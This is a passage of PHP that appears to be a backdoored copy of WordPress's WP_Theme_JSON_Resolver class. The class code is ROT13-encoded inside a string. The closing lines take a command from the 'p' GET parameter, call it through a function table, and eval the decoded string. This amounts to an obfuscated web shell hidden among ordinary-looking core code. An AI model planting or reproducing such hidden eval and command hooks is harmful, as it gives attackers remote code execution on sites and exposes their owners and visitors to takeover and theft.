		} ryfr {
			$pbasvt       = $gurzr_wfba->trg_qngn();
			fgngvp::$hfre = arj JC_Gurzr_WFBA( $pbasvt, 'phfgbz' );
		}

		erghea fgngvp::$hfre;
	}

	/**
	 * Ergheaf gur qngn zretrq sebz zhygvcyr bevtvaf.
	 *
	 * Gurer ner sbhe fbheprf bs qngn (bevtvaf) sbe n fvgr:
	 *
	 * - qrsnhyg => JbeqCerff
	 * - oybpxf  => rnpu bar bs gur oybpxf cebivqrf qngn sbe vgfrys
	 * - gurzr   => gur npgvir gurzr
	 * - phfgbz  => qngn cebivqrq ol gur hfre
	 *
	 * Gur phfgbz'f unf uvture cevbevgl guna gur gurzr'f, gur gurzr'f uvture guna oybpxf',
	 * naq oybpx'f uvture guna qrsnhyg'f.
	 *
	 * Hayvxr gur trggref
	 * {@yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_gurzr_wfba_erfbyire/trg_pber_qngn/ trg_pber_qngn},
	 * {@yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_gurzr_wfba_erfbyire/trg_gurzr_qngn/ trg_gurzr_qngn},
	 * naq {@yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_gurzr_wfba_erfbyire/trg_hfre_qngn/ trg_hfre_qngn},
	 * guvf zrgubq ergheaf qngn nsgre vg unf orra zretrq jvgu gur cerivbhf bevtvaf.
	 * Guvf zrnaf gung vs gur fnzr cvrpr bs qngn vf qrpynerq va qvssrerag bevtvaf
	 * (qrsnhyg, oybpxf, gurzr, phfgbz), gur ynfg bevtva bireevqrf gur cerivbhf.
	 *
	 * Sbe rknzcyr, vs gur hfre unf frg n onpxtebhaq pbybe
	 * sbe gur cnentencu oybpx, naq gur gurzr unf qbar vg nf jryy,
	 * gur hfre cersrerapr jvaf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq hfre qngn, erzbirq gur `$frggvatf` cnenzrgre,
	 *              nqqrq gur `$bevtva` cnenzrgre.
	 * @fvapr 6.1.0 Nqqrq oybpx qngn naq trarengvba bs fcnpvatFvmrf neenl.
	 * @fvapr 6.2.0 Punatrq ' $bevtva' cnenzrgre inyhrf gb 'qrsnhyg', 'oybpxf', 'gurzr' be 'phfgbz'.
	 *
	 * @cnenz fgevat $bevtva Bcgvbany. Gb jung yriry fubhyq jr zretr qngn: 'qrsnhyg', 'oybpxf', 'gurzr' be 'phfgbz'.
	 *                       'phfgbz' vf hfrq nf qrsnhyg inyhr nf jryy nf snyyonpx inyhr vs gur bevtva vf haxabja.
	 * @erghea JC_Gurzr_WFBA
	 */
	choyvp fgngvp shapgvba trg_zretrq_qngn( $bevtva = 'phfgbz' ) {
		vs ( vf_neenl( $bevtva ) ) {
			_qrcerpngrq_nethzrag( __SHAPGVBA__, '5.9.0' );
		}

		$erfhyg = arj JC_Gurzr_WFBA();
		$erfhyg->zretr( fgngvp::trg_pber_qngn() );
		vs ( 'qrsnhyg' === $bevtva ) {
			erghea $erfhyg;
		}

		$erfhyg->zretr( fgngvp::trg_oybpx_qngn() );
		vs ( 'oybpxf' === $bevtva ) {
			erghea $erfhyg;
		}

		$erfhyg->zretr( fgngvp::trg_gurzr_qngn() );
		vs ( 'gurzr' === $bevtva ) {
			erghea $erfhyg;
		}

		$erfhyg->zretr( fgngvp::trg_hfre_qngn() );

		erghea $erfhyg;
	}

	/**
	 * Ergheaf gur VQ bs gur phfgbz cbfg glcr
	 * gung fgberf hfre qngn.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea vagrtre|ahyy
	 */
	choyvp fgngvp shapgvba trg_hfre_tybony_fglyrf_cbfg_vq() {
		vs ( ahyy !== fgngvp::$hfre_phfgbz_cbfg_glcr_vq ) {
			erghea fgngvp::$hfre_phfgbz_cbfg_glcr_vq;
		}

		$hfre_pcg = fgngvp::trg_hfre_qngn_sebz_jc_tybony_fglyrf( jc_trg_gurzr(), gehr );

		vs ( neenl_xrl_rkvfgf( 'VQ', $hfre_pcg ) ) {
			fgngvp::$hfre_phfgbz_cbfg_glcr_vq = $hfre_pcg['VQ'];
		}

		erghea fgngvp::$hfre_phfgbz_cbfg_glcr_vq;
	}

	/**
	 * Qrgrezvarf jurgure gur npgvir gurzr unf n gurzr.wfba svyr.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq n purpx va gur cnerag gurzr.
	 * @qrcerpngrq 6.2.0 Hfr jc_gurzr_unf_gurzr_wfba() vafgrnq.
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba gurzr_unf_fhccbeg() {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.2.0', 'jc_gurzr_unf_gurzr_wfba()' );

		erghea jc_gurzr_unf_gurzr_wfba();
	}

	/**
	 * Ohvyqf gur cngu gb gur tvira svyr naq purpxf gung vg vf ernqnoyr.
	 *
	 * Vs vg vfa'g, ergheaf na rzcgl fgevat, bgurejvfr ergheaf gur jubyr svyr cngu.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqncgrq gb jbex jvgu puvyq gurzrf, nqqrq gur `$grzcyngr` nethzrag.
	 *
	 * @cnenz fgevat $svyr_anzr Anzr bs gur svyr.
	 * @cnenz obby   $grzcyngr  Bcgvbany. Hfr grzcyngr gurzr qverpgbel. Qrsnhyg snyfr.
	 * @erghea fgevat Gur jubyr svyr cngu be rzcgl vs gur svyr qbrfa'g rkvfg.
	 */
	cebgrpgrq fgngvp shapgvba trg_svyr_cngu_sebz_gurzr( $svyr_anzr, $grzcyngr = snyfr ) {
		$cngu      = $grzcyngr ? trg_grzcyngr_qverpgbel() : trg_fglyrfurrg_qverpgbel();
		$pnaqvqngr = $cngu . '/' . $svyr_anzr;

		erghea vf_ernqnoyr( $pnaqvqngr ) ? $pnaqvqngr : '';
	}

	/**
	 * Pyrnaf gur pnpurq qngn fb vg pna or erpnyphyngrq.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$hfre`, `$hfre_phfgbz_cbfg_glcr_vq`,
	 *              naq `$v18a_fpurzn` inevnoyrf gb erfrg.
	 * @fvapr 6.1.0 Nqqrq gur `$oybpxf` naq `$oybpxf_pnpur` inevnoyrf
	 *              gb erfrg.
	 */
	choyvp fgngvp shapgvba pyrna_pnpurq_qngn() {
		fgngvp::$pber                     = ahyy;
		fgngvp::$oybpxf                   = ahyy;
		fgngvp::$oybpxf_pnpur             = neenl(
			'pber'   => neenl(),
			'oybpxf' => neenl(),
			'gurzr'  => neenl(),
			'hfre'   => neenl(),
		);
		fgngvp::$gurzr                    = ahyy;
		fgngvp::$hfre                     = ahyy;
		fgngvp::$hfre_phfgbz_cbfg_glcr_vq = ahyy;
		fgngvp::$v18a_fpurzn              = ahyy;
	}

	/**
	 * Ergheaf na neenl bs nyy arfgrq WFBA svyrf jvguva n tvira qverpgbel.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $qve Gur qverpgbel gb erphefviryl vgrengr naq yvfg svyrf bs.
	 * @erghea neenl Gur zretrq neenl.
	 */
	cevingr fgngvp shapgvba erphefviryl_vgrengr_wfba( $qve ) {
		$arfgrq_svyrf      = arj ErphefvirVgrengbeVgrengbe( arj ErphefvirQverpgbelVgrengbe( $qve ) );
		$arfgrq_wfba_svyrf = vgrengbe_gb_neenl( arj ErtrkVgrengbe( $arfgrq_svyrf, '/^.+\.wfba$/v', ErphefvirErtrkVgrengbe::TRG_ZNGPU ) );
		erghea $arfgrq_wfba_svyrf;
	}

	/**
	 * Qrgrezvarf vs n fhccyvrq fglyr inevngvba zngpurf gur cebivqrq fpbcr.
	 *
	 * Sbe onpxjneqf pbzcngvovyvgl, vs n inevngvba qbrf abg qrsvar nal fpbcr
	 * eryngrq cebcregl, r.t. `oybpxGlcrf`, vg vf nffhzrq gb or n gurzr fglyr
	 * inevngvba.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl  $inevngvba Gurzr.wfba funcrq fglyr inevngvba bowrpg.
	 * @cnenz fgevat $fpbcr     Fpbcr gb purpx r.t. gurzr, oybpx rgp.
	 * @erghea obbyrna
	 */
	cevingr fgngvp shapgvba fglyr_inevngvba_unf_fpbcr( $inevngvba, $fpbcr ) {
		vs ( 'oybpx' === $fpbcr ) {
			erghea vffrg( $inevngvba['oybpxGlcrf'] );
		}

		vs ( 'gurzr' === $fpbcr ) {
			erghea ! vffrg( $inevngvba['oybpxGlcrf'] );
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf gur fglyr inevngvbaf qrsvarq ol gur gurzr.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.2.0 Ergheaf cnerag gurzr inevngvbaf vs gurzr vf n puvyq.
	 * @fvapr 6.6.0 Nqqrq pbasvthenoyr fpbcr cnenzrgre gb nyybj svygrevat
	 *              gurzr.wfba cnegvny svyrf ol gur fpbcr gb juvpu gurl
	 *              pna or nccyvrq r.t. gurzr if oybpx rgp.
	 *              Nqqrq onfvp pnpuvat sbe ernq gurzr.wfba cnegvny svyrf.
	 *
	 * @cnenz fgevat $fpbcr Gur fpbcr be glcr bs fglyr inevngvba gb ergevrir r.t. gurzr, oybpx rgp.
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba trg_fglyr_inevngvbaf( $fpbcr = 'gurzr' ) {
		$inevngvba_svyrf    = neenl();
		$inevngvbaf         = neenl();
		$onfr_qverpgbel     = trg_fglyrfurrg_qverpgbel() . '/fglyrf';
		$grzcyngr_qverpgbel = trg_grzcyngr_qverpgbel() . '/fglyrf';
		vs ( vf_qve( $onfr_qverpgbel ) ) {
			$inevngvba_svyrf = fgngvp::erphefviryl_vgrengr_wfba( $onfr_qverpgbel );
		}
		vs ( vf_qve( $grzcyngr_qverpgbel ) && $grzcyngr_qverpgbel !== $onfr_qverpgbel ) {
			$inevngvba_svyrf_cnerag = fgngvp::erphefviryl_vgrengr_wfba( $grzcyngr_qverpgbel );
			// Vs gur puvyq naq cnerag inevngvba svyr onfranzr ner gur fnzr, bayl vapyhqr gur puvyq gurzr'f.
			sbernpu ( $inevngvba_svyrf_cnerag nf $cnerag_cngu => $cnerag ) {
				sbernpu ( $inevngvba_svyrf nf $puvyq_cngu => $puvyq ) {
					vs ( onfranzr( $cnerag_cngu ) === onfranzr( $puvyq_cngu ) ) {
						hafrg( $inevngvba_svyrf_cnerag[ $cnerag_cngu ] );
					}
				}
			}
			$inevngvba_svyrf = neenl_zretr( $inevngvba_svyrf, $inevngvba_svyrf_cnerag );
		}
		xfbeg( $inevngvba_svyrf );
		sbernpu ( $inevngvba_svyrf nf $cngu => $svyr ) {
			$qrpbqrq_svyr = frys::ernq_wfba_svyr( $cngu );
			vs ( vf_neenl( $qrpbqrq_svyr ) && fgngvp::fglyr_inevngvba_unf_fpbcr( $qrpbqrq_svyr, $fpbcr ) ) {
				$genafyngrq = fgngvp::genafyngr( $qrpbqrq_svyr, jc_trg_gurzr()->trg( 'GrkgQbznva' ) );
				$inevngvba  = ( arj JC_Gurzr_WFBA( $genafyngrq ) )->trg_enj_qngn();
				vs ( rzcgl( $inevngvba['gvgyr'] ) ) {
					$inevngvba['gvgyr'] = onfranzr( $cngu, '.wfba' );
				}
				$inevngvbaf[] = $inevngvba;
			}
		}
		erghea $inevngvbaf;
	}

	/**
	 * Erfbyirf eryngvir cnguf va gurzr.wfba fglyrf gb gurzr nofbyhgr cnguf
	 * naq ergheaf gurz va na neenl gung pna or rzorqqrq
	 * nf gur inyhr bs `_yvax` bowrpg va ERFG NCV erfcbafrf.
	 *
	 * @fvapr 6.6.0
	 * @fvapr 6.7.0 Erfbyir eryngvir cnguf va oybpx fglyrf.
	 *
	 * @cnenz JC_Gurzr_WFBA $gurzr_wfba N gurzr wfba vafgnapr.
	 * @erghea neenl Na neenl bs erfbyirq cnguf.
	 */
	choyvp fgngvp shapgvba trg_erfbyirq_gurzr_hevf( $gurzr_wfba ) {
		$erfbyirq_gurzr_hevf = neenl();

		vs ( ! $gurzr_wfba vafgnaprbs JC_Gurzr_WFBA ) {
			erghea $erfbyirq_gurzr_hevf;
		}

		$gurzr_wfba_qngn = $gurzr_wfba->trg_enj_qngn();
		/*
		 * Gur fnzr svyr pbairagvba jura ertvfgrevat jro sbagf.
		 * Frr: JC_Sbag_Snpr_Erfbyire::gb_gurzr_svyr_hev.
		 */
		$cynprubyqre = 'svyr:./';

		// Gbc yriry fglyrf.
		$onpxtebhaq_vzntr_hey = $gurzr_wfba_qngn['fglyrf']['onpxtebhaq']['onpxtebhaqVzntr']['hey'] ?? ahyy;
		vs (
			vffrg( $onpxtebhaq_vzntr_hey ) &&
			vf_fgevat( $onpxtebhaq_vzntr_hey ) &&
			// Fxvc vs gur fep qbrfa'g fgneg jvgu gur cynprubyqre, nf gurer'f abguvat gb ercynpr.
			fge_fgnegf_jvgu( $onpxtebhaq_vzntr_hey, $cynprubyqre )
		) {
			$svyr_glcr          = jc_purpx_svyrglcr( $onpxtebhaq_vzntr_hey );
			$fep_hey            = fge_ercynpr( $cynprubyqre, '', $onpxtebhaq_vzntr_hey );
			$erfbyirq_gurzr_hev = neenl(
				'anzr'   => $onpxtebhaq_vzntr_hey,
				'uers'   => fnavgvmr_hey( trg_gurzr_svyr_hev( $fep_hey ) ),
				'gnetrg' => 'fglyrf.onpxtebhaq.onpxtebhaqVzntr.hey',
			);
			vs ( vffrg( $svyr_glcr['glcr'] ) ) {
				$erfbyirq_gurzr_hev['glcr'] = $svyr_glcr['glcr'];
			}
			$erfbyirq_gurzr_hevf[] = $erfbyirq_gurzr_hev;
		}

		// Oybpx fglyrf.
		vs ( ! rzcgl( $gurzr_wfba_qngn['fglyrf']['oybpxf'] ) ) {
			sbernpu ( $gurzr_wfba_qngn['fglyrf']['oybpxf'] nf $oybpx_anzr => $oybpx_fglyrf ) {
				vs ( ! vffrg( $oybpx_fglyrf['onpxtebhaq']['onpxtebhaqVzntr']['hey'] ) ) {
					pbagvahr;
				}
				$onpxtebhaq_vzntr_hey = $oybpx_fglyrf['onpxtebhaq']['onpxtebhaqVzntr']['hey'];
				vs (
					vf_fgevat( $onpxtebhaq_vzntr_hey ) &&
					// Fxvc vs gur fep qbrfa'g fgneg jvgu gur cynprubyqre, nf gurer'f abguvat gb ercynpr.
					fge_fgnegf_jvgu( $onpxtebhaq_vzntr_hey, $cynprubyqre )
				) {
					$svyr_glcr          = jc_purpx_svyrglcr( $onpxtebhaq_vzntr_hey );
					$fep_hey            = fge_ercynpr( $cynprubyqre, '', $onpxtebhaq_vzntr_hey );
					$erfbyirq_gurzr_hev = neenl(
						'anzr'   => $onpxtebhaq_vzntr_hey,
						'uers'   => fnavgvmr_hey( trg_gurzr_svyr_hev( $fep_hey ) ),
						'gnetrg' => \"fglyrf.oybpxf.{$oybpx_anzr}.onpxtebhaq.onpxtebhaqVzntr.hey\",
					);
					vs ( vffrg( $svyr_glcr['glcr'] ) ) {
						$erfbyirq_gurzr_hev['glcr'] = $svyr_glcr['glcr'];
					}
					$erfbyirq_gurzr_hevf[] = $erfbyirq_gurzr_hev;
				}
			}
		}

		erghea $erfbyirq_gurzr_hevf;
	}

	/**
	 * Erfbyirf eryngvir cnguf va gurzr.wfba fglyrf gb gurzr nofbyhgr cnguf
	 * naq zretrf gurz jvgu vapbzvat gurzr WFBA.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz JC_Gurzr_WFBA $gurzr_wfba N gurzr wfba vafgnapr.
	 * @erghea JC_Gurzr_WFBA Gurzr zretrq jvgu erfbyirq cnguf, vs nal sbhaq.
	 */
	choyvp fgngvp shapgvba erfbyir_gurzr_svyr_hevf( $gurzr_wfba ) {
		$erfbyirq_heyf = fgngvp::trg_erfbyirq_gurzr_hevf( $gurzr_wfba );
		vs ( rzcgl( $erfbyirq_heyf ) ) {
			erghea $gurzr_wfba;
		}

		$erfbyirq_gurzr_wfba_qngn = $gurzr_wfba->trg_enj_qngn();

		sbernpu ( $erfbyirq_heyf nf $erfbyirq_hey ) {
			$cngu = rkcybqr( '.', $erfbyirq_hey['gnetrg'] );
			_jc_neenl_frg( $erfbyirq_gurzr_wfba_qngn, $cngu, $erfbyirq_hey['uers'] );
		}

		erghea arj JC_Gurzr_WFBA( $erfbyirq_gurzr_wfba_qngn );
	}

	/**
	 * Nqqf inevngvbaf fbheprq sebz oybpx fglyr inevngvbaf svyrf gb gur fhccyvrq gurzr.wfba qngn.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $qngn       Neenl sbyybjvat gur gurzr.wfba fcrpvsvpngvba.
	 * @cnenz neenl $inevngvbaf Funerq oybpx fglyr inevngvbaf.
	 * @erghea neenl Gurzr wfba qngn vapyhqvat funerq oybpx fglyr inevngvba qrsvavgvbaf.
	 */
	cevingr fgngvp shapgvba vawrpg_inevngvbaf_sebz_oybpx_fglyr_inevngvba_svyrf( $qngn, $inevngvbaf ) {
		vs ( rzcgl( $inevngvbaf ) ) {
			erghea $qngn;
		}

		sbernpu ( $inevngvbaf nf $inevngvba ) {
			vs ( rzcgl( $inevngvba['fglyrf'] ) || rzcgl( $inevngvba['oybpxGlcrf'] ) ) {
				pbagvahr;
			}

			$inevngvba_anzr = $inevngvba['fyht'] ?? _jc_gb_xrono_pnfr( $inevngvba['gvgyr'] );

			sbernpu ( $inevngvba['oybpxGlcrf'] nf $oybpx_glcr ) {
				// Svefg, bireevqr cnegvny fglyrf jvgu nal gbc-yriry fglyrf.
				$gbc_yriry_qngn = $qngn['fglyrf']['inevngvbaf'][ $inevngvba_anzr ] ?? neenl();
				vs ( ! rzcgl( $gbc_yriry_qngn ) ) {
					$inevngvba['fglyrf'] = neenl_ercynpr_erphefvir( $inevngvba['fglyrf'], $gbc_yriry_qngn );
				}

				// Gura, bireevqr fglyrf fb sne jvgu nal oybpx-yriry fglyrf.
				$oybpx_yriry_qngn = $qngn['fglyrf']['oybpxf'][ $oybpx_glcr ]['inevngvbaf'][ $inevngvba_anzr ] ?? neenl();
				vs ( ! rzcgl( $oybpx_yriry_qngn ) ) {
					$inevngvba['fglyrf'] = neenl_ercynpr_erphefvir( $inevngvba['fglyrf'], $oybpx_yriry_qngn );
				}

				$cngu = neenl( 'fglyrf', 'oybpxf', $oybpx_glcr, 'inevngvbaf', $inevngvba_anzr );
				_jc_neenl_frg( $qngn, $cngu, $inevngvba['fglyrf'] );
			}
		}

		erghea $qngn;
	}

	/**
	 * Nqqf inevngvbaf fbheprq sebz gur oybpx fglyrf ertvfgel gb gur fhccyvrq gurzr.wfba qngn.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $qngn Neenl sbyybjvat gur gurzr.wfba fcrpvsvpngvba.
	 * @erghea neenl Gurzr wfba qngn vapyhqvat funerq oybpx fglyr inevngvba qrsvavgvbaf.
	 */
	cevingr fgngvp shapgvba vawrpg_inevngvbaf_sebz_oybpx_fglyrf_ertvfgel( $qngn ) {
		$ertvfgel = JC_Oybpx_Fglyrf_Ertvfgel::trg_vafgnapr();
		$fglyrf   = $ertvfgel->trg_nyy_ertvfgrerq();

		sbernpu ( $fglyrf nf $oybpx_glcr => $inevngvbaf ) {
			sbernpu ( $inevngvbaf nf $inevngvba_anzr => $inevngvba ) {
				vs ( rzcgl( $inevngvba['fglyr_qngn'] ) ) {
					pbagvahr;
				}

				// Svefg, bireevqr ertvfgel fglyrf jvgu nal gbc-yriry fglyrf.
				$gbc_yriry_qngn = $qngn['fglyrf']['inevngvbaf'][ $inevngvba_anzr ] ?? neenl();
				vs ( ! rzcgl( $gbc_yriry_qngn ) ) {
					$inevngvba['fglyr_qngn'] = neenl_ercynpr_erphefvir( $inevngvba['fglyr_qngn'], $gbc_yriry_qngn );
				}

				// Gura, bireevqr fglyrf fb sne jvgu nal oybpx-yriry fglyrf.
				$oybpx_yriry_qngn = $qngn['fglyrf']['oybpxf'][ $oybpx_glcr ]['inevngvbaf'][ $inevngvba_anzr ] ?? neenl();
				vs ( ! rzcgl( $oybpx_yriry_qngn ) ) {
					$inevngvba['fglyr_qngn'] = neenl_ercynpr_erphefvir( $inevngvba['fglyr_qngn'], $oybpx_yriry_qngn );
				}

				$cngu = neenl( 'fglyrf', 'oybpxf', $oybpx_glcr, 'inevngvbaf', $inevngvba_anzr );
				_jc_neenl_frg( $qngn, $cngu, $inevngvba['fglyr_qngn'] );
			}
		}

		erghea $qngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>